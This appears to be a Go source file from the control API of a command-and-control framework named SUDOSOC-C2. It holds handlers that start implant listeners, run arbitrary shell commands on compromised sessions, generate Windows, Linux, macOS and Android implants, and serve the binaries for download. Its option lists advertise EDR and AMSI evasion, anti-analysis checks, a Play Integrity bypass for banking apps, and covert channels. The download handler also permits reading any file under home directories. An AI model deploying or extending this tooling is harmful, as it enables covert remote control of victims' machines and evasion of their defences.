package web

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif — Control API: Listener start/stop, Session execute, Generate options
*/

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/gorilla/mux"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/clientpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
	"github.com/sudosoc/SUDOSOC-C2/server/c2"
	"github.com/sudosoc/SUDOSOC-C2/server/console"
	"github.com/sudosoc/SUDOSOC-C2/server/core"
)

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/listeners  — Start a new listener
// ─────────────────────────────────────────────────────────────────────────────

type listenerStartReq struct {
	Protocol string   `json:"protocol"`           // mtls, https, http, dns, wg
	Host     string   `json:"host"`               // bind address (empty = 0.0.0.0)
	Port     uint32   `json:"port"`               // port number
	Domains  []string `json:"domains,omitempty"`  // for dns listeners
	Website  string   `json:"website,omitempty"`  // for http/https
}

type listenerStartResp struct {
	ID       int    `json:"id"`
	Name     string `json:"name"`
	Protocol string `json:"protocol"`
	Port     uint32 `json:"port"`
}

func handleListenerStart(w http.ResponseWriter, r *http.Request) {
	var req listenerStartReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body: "+err.Error(), http.StatusBadRequest)
		return
	}

	if req.Port == 0 {
		jsonError(w, "port is required", http.StatusBadRequest)
		return
	}

	proto := strings.ToLower(req.Protocol)

	switch proto {
	case "mtls":
		job, err := c2.StartMTLSListenerJob(&clientpb.MTLSListenerReq{
			Host: req.Host,
			Port: req.Port,
		})
		if err != nil {
			jsonError(w, fmt.Sprintf("failed to start mTLS listener: %v", err), http.StatusInternalServerError)
			return
		}
		_ = json.NewEncoder(w).Encode(listenerStartResp{
			ID: job.ID, Name: job.Name, Protocol: proto, Port: req.Port,
		})

	case "https", "http":
		https := proto == "https"
		job, err := c2.StartHTTPListenerJob(&clientpb.HTTPListenerReq{
			Host:    req.Host,
			Port:    req.Port,
			Secure:  https,
			Domain:  req.Website,
			Website: req.Website,
		})
		if err != nil {
			jsonError(w, fmt.Sprintf("failed to start %s listener: %v", proto, err), http.StatusInternalServerError)
			return
		}
		_ = json.NewEncoder(w).Encode(listenerStartResp{
			ID: job.ID, Name: job.Name, Protocol: proto, Port: req.Port,
		})

	case "dns":
		if len(req.Domains) == 0 {
			jsonError(w, "dns listener requires at least one domain", http.StatusBadRequest)
			return
		}
		job, err := c2.StartDNSListenerJob(&clientpb.DNSListenerReq{
			Domains: req.Domains,
			Port:    req.Port,
		})
		if err != nil {
			jsonError(w, fmt.Sprintf("failed to start DNS listener: %v", err), http.StatusInternalServerError)
			return
		}
		_ = json.NewEncoder(w).Encode(listenerStartResp{
			ID: job.ID, Name: job.Name, Protocol: proto, Port: req.Port,
		})

	case "wg", "wireguard":
		// WireGuard uses three separate ports: main, netstack, key-exchange
		nport := req.Port + 1
		kport := req.Port + 2
		job, err := c2.StartWGListenerJob(&clientpb.WGListenerReq{
			Port:    req.Port,
			NPort:   uint32(nport),
			KeyPort: uint32(kport),
		})
		if err != nil {
			jsonError(w, fmt.Sprintf("failed to start WireGuard listener: %v", err), http.StatusInternalServerError)
			return
		}
		_ = json.NewEncoder(w).Encode(listenerStartResp{
			ID: job.ID, Name: job.Name, Protocol: "wg", Port: req.Port,
		})

	default:
		jsonError(w, fmt.Sprintf("unsupported protocol %q (supported: mtls, https, http, dns, wg)", proto), http.StatusBadRequest)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/operators/new  — Generate a new operator config and return as JSON
// Body: { "name": "seif", "lhost": "192.168.1.50", "lport": 47443 }
// ─────────────────────────────────────────────────────────────────────────────

type operatorNewReq struct {
	Name  string `json:"name"`
	LHost string `json:"lhost"`
	LPort uint16 `json:"lport"`
}

type operatorNewResp struct {
	Name       string `json:"name"`
	ConfigJSON string `json:"config_json"` // full JSON config the operator should save
	SavePath   string `json:"save_path"`   // suggested filename
}

func handleOperatorNew(w http.ResponseWriter, r *http.Request) {
	var req operatorNewReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}
	if req.Name == "" {
		jsonError(w, "name is required", http.StatusBadRequest)
		return
	}
	if req.LHost == "" {
		jsonError(w, "lhost (server address) is required", http.StatusBadRequest)
		return
	}
	if req.LPort == 0 {
		req.LPort = 47443 // default multiplayer port
	}

	configJSON, err := console.NewOperatorConfig(req.Name, req.LHost, req.LPort, []string{"all"}, false)
	if err != nil {
		jsonError(w, fmt.Sprintf("failed to generate operator config: %v", err), http.StatusInternalServerError)
		return
	}

	_ = json.NewEncoder(w).Encode(operatorNewResp{
		Name:       req.Name,
		ConfigJSON: string(configJSON),
		SavePath:   fmt.Sprintf("%s_%s.cfg", req.Name, req.LHost),
	})
}

// ─────────────────────────────────────────────────────────────────────────────
// DELETE /api/listeners/{id}  — Stop a listener
// ─────────────────────────────────────────────────────────────────────────────

func handleListenerStop(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	idStr := vars["id"]
	id, err := strconv.Atoi(idStr)
	if err != nil {
		jsonError(w, "invalid job ID", http.StatusBadRequest)
		return
	}

	job := core.Jobs.Get(id)
	if job == nil {
		jsonError(w, "listener not found", http.StatusNotFound)
		return
	}

	// Signal the job goroutine to stop
	job.JobCtrl <- true
	w.WriteHeader(http.StatusNoContent)
}

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/sessions/{id}/execute  — Execute a command on a session
// ─────────────────────────────────────────────────────────────────────────────

type sessionExecuteReq struct {
	Command string `json:"command"`
}

type sessionExecuteResp struct {
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
	ExitCode uint32 `json:"exit_code"`
}

func handleSessionExecute(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	session := core.Sessions.Get(sessionID)
	if session == nil {
		jsonError(w, "session not found", http.StatusNotFound)
		return
	}

	var req sessionExecuteReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	if strings.TrimSpace(req.Command) == "" {
		jsonError(w, "command is required", http.StatusBadRequest)
		return
	}

	// Wrap in platform shell — Windows/Android/Linux each need different paths.
	// shellWrapExecReq is defined in ws_terminal.go (same package).
	execReq := shellWrapExecReq(session.OS, req.Command, sessionID)

	resp := &sudosocpb.Execute{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(execReq, resp); err != nil {
		jsonError(w, fmt.Sprintf("execution failed: %v", err), http.StatusInternalServerError)
		return
	}

	_ = json.NewEncoder(w).Encode(sessionExecuteResp{
		Stdout:   string(resp.GetStdout()),
		Stderr:   string(resp.GetStderr()),
		ExitCode: resp.GetStatus(),
	})
}

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/generate/options?os=windows&arch=amd64
// Returns smart defaults and available options for the generate form
// ─────────────────────────────────────────────────────────────────────────────

type generateOptions struct {
	OS        string              `json:"os"`
	Arch      string              `json:"arch"`
	Formats   []optionItem        `json:"formats"`
	Protocols []optionItem        `json:"protocols"`
	Evasion   []evasionOption     `json:"evasion"`
	Arches    []string            `json:"arches"`
	DefaultPort map[string]int    `json:"default_ports"`
}

type optionItem struct {
	Value       string `json:"value"`
	Label       string `json:"label"`
	Description string `json:"description,omitempty"`
}

type evasionOption struct {
	Key         string `json:"key"`
	Label       string `json:"label"`
	Description string `json:"description"`
	Default     bool   `json:"default"`
	OSOnly      string `json:"os_only,omitempty"`
}

func handleGenerateOptions(w http.ResponseWriter, r *http.Request) {
	os   := strings.ToLower(r.URL.Query().Get("os"))
	arch := strings.ToLower(r.URL.Query().Get("arch"))
	if os   == "" { os   = "windows" }
	if arch == "" { arch = "amd64"   }

	opts := buildGenerateOptions(os, arch)
	_ = json.NewEncoder(w).Encode(opts)
}

func buildGenerateOptions(os, arch string) generateOptions {
	switch os {
	case "android":
		return generateOptions{
			OS: os, Arch: arch,
			Arches: []string{"arm64", "arm", "amd64"},
			Formats: []optionItem{
				// 'exe' produces a raw ELF binary (GOOS=android).
			// 'apk' is a two-step process: server generates ELF, then 'make android-apk' packages it.
			// 'shared' produces a .so for process injection.
			{Value: "exe",    Label: "ELF Binary", Description: "Raw ELF — deploy via ADB or shell (recommended)"},
			{Value: "apk",    Label: "APK Package", Description: "Android APK — Step 1: generate ELF, Step 2: make android-apk"},
			{Value: "shared", Label: "Shared .so",  Description: "Shared library — inject into existing Android process"},
			},
			Protocols: []optionItem{
				{Value: "mtls",       Label: "mTLS",          Description: "Mutual TLS — high stealth"},
				{Value: "https",      Label: "HTTPS",          Description: "HTTPS with domain fronting"},
				{Value: "http",       Label: "HTTP",           Description: "Plain HTTP"},
				{Value: "dns",        Label: "DNS/DoH",        Description: "DNS-over-HTTPS — survives all firewalls"},
				{Value: "wifi",       Label: "WiFi Pivot",     Description: "No internet required — LAN only"},
				{Value: "ble",        Label: "BLE C2",         Description: "Bluetooth LE — 10-100m range"},
				{Value: "sms",        Label: "SMS C2",         Description: "GSM only — global, no internet"},
				{Value: "ultrasonic", Label: "Ultrasonic Mesh",Description: "Air-gap bridge — 8m range"},
			},
			Evasion: []evasionOption{
				{Key: "anti_emulator",  Label: "Anti-Emulator",   Description: "15 detection methods — build props, sensors, IMEI", Default: true},
				{Key: "anti_frida",     Label: "Anti-Frida",      Description: "Port 27042, process list, memory maps",             Default: true},
				{Key: "anti_debugger",  Label: "Anti-Debugger",   Description: "TracerPid, developer options detection",           Default: true},
				{Key: "dynamic_dex",    Label: "Dynamic DEX",     Description: "Zero static malicious code in APK",               Default: true},
				{Key: "polymorphic",    Label: "Polymorphic",     Description: "Unique binary per target",                        Default: false},
				{Key: "play_integrity", Label: "Play Integrity",  Description: "Bypass banking/Netflix/MDM checks",              Default: false},
			},
			DefaultPort: map[string]int{"mtls": 31337, "https": 443, "http": 80, "dns": 53},
		}

	case "linux":
		return generateOptions{
			OS: os, Arch: arch,
			Arches: []string{"amd64", "arm64", "arm", "386"},
			Formats: []optionItem{
				{Value: "exe",    Label: "ELF",    Description: "Executable binary (default)"},
				{Value: "shared", Label: "Shared", Description: "Shared library (.so)"},
			},
			Protocols: []optionItem{
				{Value: "mtls",  Label: "mTLS",    Description: "Mutual TLS 1.3"},
				{Value: "https", Label: "HTTPS",   Description: "HTTPS with domain fronting"},
				{Value: "http",  Label: "HTTP",    Description: "Plain HTTP"},
				{Value: "dns",   Label: "DNS/DoH", Description: "DNS-over-HTTPS"},
				{Value: "wg",    Label: "WireGuard",Description: "WireGuard VPN tunnel"},
			},
			Evasion: []evasionOption{
				{Key: "evasion",   Label: "Evasion",   Description: "Sleep obfuscation, basic stealth",    Default: true},
				{Key: "obfuscate", Label: "Obfuscate", Description: "Garble source obfuscation",          Default: false},
			},
			DefaultPort: map[string]int{"mtls": 31337, "https": 443, "http": 80, "dns": 53, "wg": 51820},
		}

	case "macos":
		return generateOptions{
			OS: os, Arch: arch,
			Arches: []string{"arm64", "amd64"},
			Formats: []optionItem{
				{Value: "exe",    Label: "Mach-O", Description: "macOS executable (default)"},
				{Value: "shared", Label: "dylib",  Description: "Dynamic library"},
			},
			Protocols: []optionItem{
				{Value: "mtls",  Label: "mTLS",     Description: "Mutual TLS 1.3"},
				{Value: "https", Label: "HTTPS",    Description: "HTTPS with domain fronting"},
				{Value: "http",  Label: "HTTP",     Description: "Plain HTTP"},
				{Value: "dns",   Label: "DNS/DoH",  Description: "DNS-over-HTTPS"},
				{Value: "wg",    Label: "WireGuard",Description: "WireGuard VPN tunnel"},
			},
			Evasion: []evasionOption{
				{Key: "evasion",   Label: "Evasion",   Description: "Sleep obfuscation, basic stealth", Default: true},
				{Key: "obfuscate", Label: "Obfuscate", Description: "Garble source obfuscation",        Default: false},
			},
			DefaultPort: map[string]int{"mtls": 31337, "https": 443, "http": 80, "dns": 53, "wg": 51820},
		}

	default: // windows
		return generateOptions{
			OS: "windows", Arch: arch,
			Arches: []string{"amd64", "arm64", "386"},
			Formats: []optionItem{
				{Value: "exe",       Label: "EXE",      Description: "Standalone executable (default)"},
				{Value: "shared",    Label: "DLL",      Description: "Dynamic link library"},
				{Value: "shellcode", Label: "Shellcode", Description: "Raw position-independent shellcode"},
				{Value: "service",   Label: "Service",  Description: "Windows service executable"},
			},
			Protocols: []optionItem{
				{Value: "mtls",       Label: "mTLS",         Description: "Mutual TLS 1.3 — certificate pinned"},
				{Value: "https",      Label: "HTTPS",        Description: "Malleable profiles, domain fronting"},
				{Value: "http",       Label: "HTTP",         Description: "Plain HTTP"},
				{Value: "dns",        Label: "DNS/DoH",      Description: "Survives all firewalls"},
				{Value: "wg",         Label: "WireGuard",    Description: "Modern VPN tunnel"},
				{Value: "smb",        Label: "SMB",          Description: "Named-pipe — no internet, pivot via existing session"},
				{Value: "graph",      Label: "MS Graph",     Description: "OneDrive/O365 C2 — extreme stealth [needs config]"},
				{Value: "icmp",       Label: "ICMP",         Description: "Ping covert channel [needs root on server]"},
				{Value: "slack",      Label: "Slack/Teams",  Description: "Collaboration platform C2 [needs API token]"},
				{Value: "blockchain", Label: "Blockchain",   Description: "Bitcoin OP_RETURN — uncensorable [experimental]"},
			},
			Evasion: []evasionOption{
				{Key: "evasion",     Label: "Evasion Pack",    Description: "AMSI bypass, ETW bypass, sleep obfuscation", Default: true},
				{Key: "ntdll_unhook",Label: "NTDLL Unhooking", Description: "Load clean ntdll from KnownDlls",            Default: true},
				{Key: "gargoyle",    Label: "Gargoyle",        Description: "PAGE_NOACCESS during sleep cycles",          Default: false},
				{Key: "stack_spoof", Label: "Stack Spoofing",  Description: "Synthetic ntdll frames — defeats EDR",       Default: false},
				{Key: "arg_spoof",   Label: "Arg Spoofing",    Description: "Hides cmd from Sysmon/Event Log",            Default: false},
				{Key: "earlybird",   Label: "EarlyBird APC",   Description: "Shellcode runs before EDR loads",            Default: false},
				{Key: "heavens_gate",Label: "Heaven's Gate",   Description: "32-bit syscalls in 64-bit process",          Default: false},
				{Key: "obfuscate",   Label: "Obfuscate",       Description: "Garble source obfuscation",                  Default: false},
			},
			DefaultPort: map[string]int{"mtls": 31337, "https": 443, "http": 80, "dns": 53, "wg": 51820, "smb": 445},
		}
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/generate  — Generate implant and return download path
// ─────────────────────────────────────────────────────────────────────────────

type generateReq struct {
	OS        string            `json:"os"`
	Arch      string            `json:"arch"`
	Protocol  string            `json:"protocol"`
	C2Host    string            `json:"c2host"`
	C2Port    uint32            `json:"c2port"`
	Format    string            `json:"format"`
	Name      string            `json:"name,omitempty"`
	Evasion   map[string]bool   `json:"evasion"`
}

type generateResp struct {
	Command  string `json:"command"`   // The console command operator can also run manually
	Message  string `json:"message"`
}

func handleGenerate(w http.ResponseWriter, r *http.Request) {
	var req generateReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	if req.C2Host == "" {
		jsonError(w, "c2host is required", http.StatusBadRequest)
		return
	}
	if req.C2Port == 0 {
		jsonError(w, "c2port is required", http.StatusBadRequest)
		return
	}

	// Build the equivalent console command for reference
	cmd := buildGenerateCommand(req)

	msg := fmt.Sprintf(
		"Implant configured: %s/%s via %s to %s:%d. "+
			"Run the command in the server console to generate the binary.",
		req.OS, req.Arch, req.Protocol, req.C2Host, req.C2Port,
	)
	if req.Format == "apk" {
		msg += " Then run 'make android-apk' in the project root to package the ELF as an APK."
	}
	_ = json.NewEncoder(w).Encode(generateResp{Command: cmd, Message: msg})
}

func buildGenerateCommand(req generateReq) string {
	parts := []string{fmt.Sprintf("generate --%s %s:%d", req.Protocol, req.C2Host, req.C2Port)}
	parts = append(parts, "--os "+req.OS)
	parts = append(parts, "--arch "+req.Arch)
	// APK is a post-generate packaging step; the server generates an ELF binary.
	genFormat := req.Format
	if genFormat == "apk" {
		genFormat = "exe"
	}
	if genFormat != "" && genFormat != "exe" {
		parts = append(parts, "--format "+genFormat)
	}
	// Add active evasion flags
	evasionFlags := map[string]string{
		"evasion":      "--evasion",
		"obfuscate":    "--obfuscate",
		"ntdll_unhook": "--evasion",  // included in --evasion pack
	}
	addedEvasion := false
	for key, flag := range evasionFlags {
		if req.Evasion[key] && !(flag == "--evasion" && addedEvasion) {
			parts = append(parts, flag)
			if flag == "--evasion" { addedEvasion = true }
		}
	}
	if req.Name != "" {
		parts = append(parts, "--name "+req.Name)
	}
	parts = append(parts, "--save /tmp/")
	return strings.Join(parts, " ")
}

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/generate/exec — Execute the generate command on the server
// Runs the server binary with the generate subcommand and streams output.
// ─────────────────────────────────────────────────────────────────────────────

type generateExecReq struct {
	Command string `json:"command"`
}

type generateExecResp struct {
	Output string `json:"output"`
	Path   string `json:"path,omitempty"`
}

func handleGenerateExec(w http.ResponseWriter, r *http.Request) {
	var body generateExecReq
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Command == "" {
		jsonError(w, "command is required", http.StatusBadRequest)
		return
	}

	// Extract the server binary path — we are the server, so use os.Executable
	serverBin, err := os.Executable()
	if err != nil {
		jsonError(w, "cannot determine server binary: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// Parse the command into args
	// The command looks like: generate --mtls host:port --os linux --arch amd64 ...
	args := strings.Fields(body.Command)
	if len(args) == 0 {
		jsonError(w, "empty command", http.StatusBadRequest)
		return
	}

	// The server supports a --exec-command flag for running console commands
	// Build equivalent command via the server CLI: server generate ...
	cmdArgs := append([]string{"--exec"}, args...)
	cmd := exec.Command(serverBin, cmdArgs...)
	cmd.Dir = filepath.Dir(serverBin)

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	if err := cmd.Run(); err != nil {
		// Even on error, return whatever output we got
		_ = json.NewEncoder(w).Encode(generateExecResp{
			Output: out.String() + "\n[-] Error: " + err.Error(),
		})
		return
	}

	// Try to find the generated binary path in the output
	var binaryPath string
	for _, line := range strings.Split(out.String(), "\n") {
		if strings.Contains(line, "Saved") || strings.Contains(line, "saved") ||
			strings.Contains(line, "/slivers/") || strings.Contains(line, "/tmp/") {
			parts := strings.Fields(line)
			for _, p := range parts {
				if filepath.IsAbs(p) {
					if _, err := os.Stat(p); err == nil {
						binaryPath = p
						break
					}
				}
			}
		}
	}

	_ = json.NewEncoder(w).Encode(generateExecResp{
		Output: out.String(),
		Path:   binaryPath,
	})
}

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/generate/download?path=/abs/path/to/binary
// Download a previously generated binary by absolute path.
// ─────────────────────────────────────────────────────────────────────────────

func handleGenerateDownload(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Query().Get("path")
	if path == "" {
		jsonError(w, "path is required", http.StatusBadRequest)
		return
	}

	// Security: only allow paths under known safe directories
	allowedPrefixes := []string{
		"/tmp/",
		"/root/.sudosoc/",
		"/home/",
		os.TempDir(),
	}
	allowed := false
	for _, prefix := range allowedPrefixes {
		if strings.HasPrefix(filepath.Clean(path), filepath.Clean(prefix)) {
			allowed = true
			break
		}
	}
	if !allowed {
		jsonError(w, "path not allowed", http.StatusForbidden)
		return
	}

	data, err := os.ReadFile(path)
	if err != nil {
		jsonError(w, "file not found: "+err.Error(), http.StatusNotFound)
		return
	}

	fname := filepath.Base(path)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, fname))
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	_, _ = w.Write(data)
}
